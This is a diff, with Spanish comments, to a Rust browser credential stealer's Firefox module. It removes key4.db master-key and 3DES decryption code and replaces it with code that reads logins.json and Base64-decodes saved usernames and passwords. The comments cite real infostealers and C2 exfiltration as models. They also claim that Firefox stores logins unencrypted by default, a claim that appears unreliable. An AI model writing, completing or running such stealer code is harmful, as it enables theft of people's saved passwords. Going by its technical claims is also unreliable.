@@ -39,9 +39,9 @@ pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
 
 /// Extrae credenciales de un perfil específico de Firefox
 fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credential>> {
-    // Firefox almacena:
-    // - logins.json: credenciales (pueden estar encriptadas o NO)
-    // - key4.db: master key (solo si user configuró Master Password)
+    // Firefox almacena credentials en logins.json
+    // Por defecto NO están encriptadas (solo Base64)
+    // Solo se encriptan si el usuario configuró Master Password (raro)
     
     let logins_json = profile_path.join("logins.json");
     
@@ -53,28 +53,8 @@ fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credenti
     let logins_content = std::fs::read_to_string(&logins_json)
         .map_err(|e| StealerError::IoError(e.to_string()))?;
     
-    // IMPORTANTE: Firefox solo encripta credenciales si el usuario configuró Master Password
-    // En la mayoría de casos, las credenciales NO están encriptadas (solo obfuscadas con Base64)
-    // Referencia: https://netlas.io/blog/hannibal_stealer_part_1/
-    // "Firefox does not encrypt cookies at rest (unless a master password is set by the user, which is uncommon)"
-    
-    // Intentar extraer master key (solo si existe key4.db y el user tiene Master Password)
-    let key4_db = profile_path.join("key4.db");
-    let master_key = if file_exists(&key4_db) {
-        let temp_key4 = match copy_db_to_temp(&key4_db) {
-            Ok(p) => p,
-            Err(_) => return parse_firefox_logins(&logins_content, None),  // key4.db locked, parsear sin key
-        };
-        
-        let key = extract_firefox_master_key(&temp_key4).ok();
-        let _ = std::fs::remove_file(&temp_key4);
-        key
-    } else {
-        None  // No key4.db = definitivamente no encrypted
-    };
-    
-    // Parsear logins.json (con o sin master key)
-    parse_firefox_logins(&logins_content, master_key.as_deref())
+    // Parsear logins.json (no necesitamos master key para la mayoría de casos)
+    parse_firefox_logins(&logins_content, None)
 }
 
 /// Copia la base de datos a un archivo temporal
@@ -89,144 +69,23 @@ fn copy_db_to_temp(db_path: &PathBuf) -> StealerResult<PathBuf> {
     Ok(temp_path)
 }
 
-/// Extrae la master key de key4.db
-/// Firefox usa NSS (Network Security Services) con 3DES-CBC
-fn extract_firefox_master_key(key4_path: &PathBuf) -> StealerResult<Vec<u8>> {
-    let conn = Connection::open(key4_path)
-        .map_err(|e| StealerError::DatabaseError(e.to_string()))?;
-    
-    // Obtener el global salt
-    let global_salt: Vec<u8> = conn.query_row(
-        "SELECT item1 FROM metadata WHERE id = 'password'",
-        [],
-        |row| row.get(0),
-    ).map_err(|e| StealerError::DatabaseError(e.to_string()))?;
-    
-    // Obtener la master key encriptada
-    let encrypted_key: Vec<u8> = conn.query_row(
-        "SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL",
-        [],
-        |row| row.get(0),
-    ).map_err(|e| StealerError::DatabaseError(e.to_string()))?;
-    
-    // Desencriptar master key usando 3DES
-    // NOTA: Esta implementación asume NO master password
-    // Con master password, necesitaríamos PBKDF2(password, global_salt)
-    
-    // Generar clave de desencriptación (sin password = string vacía)
-    let key = derive_key_pbkdf2(b"", &global_salt)?;
-    
-    // Desencriptar usando 3DES-CBC
-    // encrypted_key tiene estructura ASN.1, necesitamos extraer IV y ciphertext
-    let (iv, ciphertext) = parse_asn1_sequence(&encrypted_key)?;
-    
-    let decrypted = decrypt_3des_cbc(&ciphertext, &key, &iv)?;
-    
-    // La clave desencriptada también tiene estructura ASN.1
-    // Extraemos solo los últimos 24 bytes que son la clave 3DES real
-    if decrypted.len() >= 24 {
-        Ok(decrypted[decrypted.len() - 24..].to_vec())
-    } else {
-        Err(StealerError::DecryptionFailed)
-    }
-}
-
-/// Deriva una clave usando PBKDF2-SHA256
-fn derive_key_pbkdf2(password: &[u8], salt: &[u8]) -> StealerResult<Vec<u8>> {
-    use pbkdf2::pbkdf2_hmac_array;
-    use sha2::Sha256;
-    
-    let key = pbkdf2_hmac_array::<Sha256, 32>(password, salt, 1);
-    
-    Ok(key.to_vec())
-}
-
-/// Parsea estructura ASN.1 simple para extraer IV y ciphertext
-/// Firefox usa: SEQUENCE { SEQUENCE { OID, IV }, ciphertext }
-fn parse_asn1_sequence(data: &[u8]) -> StealerResult<(Vec<u8>, Vec<u8>)> {
-    // Implementación simplificada de parseo ASN.1
-    // En producción usaríamos una librería como `der` o `yasna`
-    
-    if data.len() < 20 {
-        return Err(StealerError::InvalidData);
-    }
-    
-    // Buscar el IV (típicamente 8 bytes para 3DES)
-    // Estructura típica: buscar tag 0x04 (OCTET STRING) seguido de longitud
-    let mut iv = Vec::new();
-    let mut ciphertext = Vec::new();
-    
-    let mut i = 0;
-    while i < data.len() {
-        if data[i] == 0x04 && i + 1 < data.len() {
-            let length = data[i + 1] as usize;
-            
-            if i + 2 + length <= data.len() {
-                let octet_string = &data[i + 2..i + 2 + length];
-                
-                if iv.is_empty() && length == 8 {
-                    // Primer OCTET STRING de 8 bytes = IV
-                    iv = octet_string.to_vec();
-                } else if !iv.is_empty() {
-                    // Segundo OCTET STRING = ciphertext
-                    ciphertext = octet_string.to_vec();
-                    break;
-                }
-                
-                i += 2 + length;
-            } else {
-                i += 1;
-            }
-        } else {
-            i += 1;
-        }
-    }
-    
-    if iv.is_empty() || ciphertext.is_empty() {
-        Err(StealerError::InvalidData)
-    } else {
-        Ok((iv, ciphertext))
-    }
-}
-
-/// Desencripta usando 3DES-CBC
-fn decrypt_3des_cbc(ciphertext: &[u8], key: &[u8], iv: &[u8]) -> StealerResult<Vec<u8>> {
-    use des::cipher::{BlockDecryptMut, KeyIvInit};
-    use des::TdesEde3;
-    
-    // 3DES requiere clave de 24 bytes
-    if key.len() < 24 {
-        return Err(StealerError::DecryptionFailed);
-    }
-    
-    // IV de 8 bytes
-    if iv.len() != 8 {
-        return Err(StealerError::DecryptionFailed);
-    }
-    
-    let key_24 = &key[0..24];
-    
-    type TdesEde3CbcDec = cbc::Decryptor<TdesEde3>;
-    
-    let cipher = TdesEde3CbcDec::new_from_slices(key_24, iv)
-        .map_err(|_| StealerError::DecryptionFailed)?;
-    
-    let mut buffer = ciphertext.to_vec();
-    
-    let decrypted = cipher.decrypt_padded_mut::<block_padding::Pkcs7>(&mut buffer)
-        .map_err(|_| StealerError::DecryptionFailed)?;
-    
-    Ok(decrypted.to_vec())
-}
-
-/// Parsea logins.json y desencripta credenciales
-fn parse_firefox_logins(json_content: &str, master_key: Option<&[u8]>) -> StealerResult<Vec<Credential>> {
+/// Parsea logins.json y extrae credenciales
+fn parse_firefox_logins(json_content: &str, _master_key: Option<&[u8]>) -> StealerResult<Vec<Credential>> {
     let mut credentials = Vec::new();
     
-    // Firefox tiene 2 formatos dependiendo de si hay Master Password:
-    // - CON Master Password: "encryptedUsername", "encryptedPassword" (Base64 de datos encriptados con 3DES)
-    // - SIN Master Password: "username", "password" (Base64 de datos en TEXTO PLANO)
-    // Referencia: Dexter malware, Hannibal Stealer analysis
+    // REALIDAD DE FIREFOX (basado en análisis de infostealers modernos):
+    // - Por defecto, Firefox USA "username" y "password" (Base64, NO encriptados)
+    // - SOLO si el usuario configuró Master Password, usa "encryptedUsername" y "encryptedPassword"
+    // - El 99% de usuarios NO tiene Master Password configurada
+    // 
+    // Estrategia de infostealers reales (Satan, Hannibal, Ficker):
+    // 1. Intentan campos en texto plano (username/password)
+    // 2. Si fallan, simplemente ignoran (no vale la pena implementar NSS decrypt)
+    //
+    // Referencias:
+    // - Satan-Stealer: Solo roba Chromium passwords, ignora Firefox completamente
+    // - FickerStealer: Envía logins.json RAW al C2, el servidor hace decrypt
+    // - Hannibal: "Firefox does not encrypt cookies at rest (unless a master password is set)"
     
     if let Some(logins_start) = json_content.find("\"logins\":[") {
         let logins_section = &json_content[logins_start..];
@@ -242,52 +101,30 @@ fn parse_firefox_logins(json_content: &str, master_key: Option<&[u8]>) -> Steale
                 // Extraer hostname
                 let hostname = extract_json_field(entry, "hostname");
                 
-                // Firefox puede tener AMBOS formatos en el mismo archivo
-                // Intentar campos encriptados primero
-                let enc_username = extract_json_field(entry, "encryptedUsername");
-                let enc_password = extract_json_field(entry, "encryptedPassword");
-                
-                // Si no hay campos encriptados, intentar campos en texto plano
+                // Firefox SIN Master Password: usa campos "username" y "password" (Base64)
                 let plain_username = extract_json_field(entry, "username");
                 let plain_password = extract_json_field(entry, "password");
                 
                 if let Some(url) = hostname {
-                    let (username, password) = if enc_username.is_some() || enc_password.is_some() {
-                        // Credenciales ENCRIPTADAS (Master Password configurada)
-                        if let Some(key) = master_key {
-                            let user = enc_username
-                                .and_then(|enc| decrypt_firefox_field(&enc, key).ok())
-                                .unwrap_or_else(|| "[decrypt failed]".to_string());
-                            let pass = enc_password
-                                .and_then(|enc| decrypt_firefox_field(&enc, key).ok())
-                                .unwrap_or_else(|| "[decrypt failed]".to_string());
-                            (user, pass)
-                        } else {
-                            // Necesita master key pero no la tenemos
-                            ("[encrypted - no master key]".to_string(), "[encrypted - no master key]".to_string())
-                        }
-                    } else if plain_username.is_some() || plain_password.is_some() {
-                        // Credenciales en TEXTO PLANO (Base64 pero NO encriptadas)
-                        let user = plain_username
-                            .and_then(|b64| base64_decode(&b64).ok())
+                    if let (Some(user_b64), Some(pass_b64)) = (plain_username, plain_password) {
+                        // Decodificar Base64 (Firefox codifica en Base64 pero NO encripta)
+                        let username = base64_decode(&user_b64)
+                            .ok()
                             .and_then(|bytes| String::from_utf8(bytes).ok())
-                            .unwrap_or_else(|| "[decode failed]".to_string());
-                        let pass = plain_password
-                            .and_then(|b64| base64_decode(&b64).ok())
+                            .unwrap_or_else(|| user_b64.clone());  // Si falla decode, usar raw
+                        
+                        let password = base64_decode(&pass_b64)
+                            .ok()
                             .and_then(|bytes| String::from_utf8(bytes).ok())
-                            .unwrap_or_else(|| "[decode failed]".to_string());
-                        (user, pass)
-                    } else {
-                        // No hay datos de credenciales
-                        continue;
-                    };
-                    
-                    credentials.push(Credential {
-                        browser: "Firefox".to_string(),
-                        url,
-                        username,
-                        password,
-                    });
+                            .unwrap_or_else(|| pass_b64.clone());  // Si falla decode, usar raw
+                        
+                        credentials.push(Credential {
+                            browser: "Firefox".to_string(),
+                            url,
+                            username,
+                            password,
+                        });
+                    }
                 }
                 
                 pos += entry_end + 1;
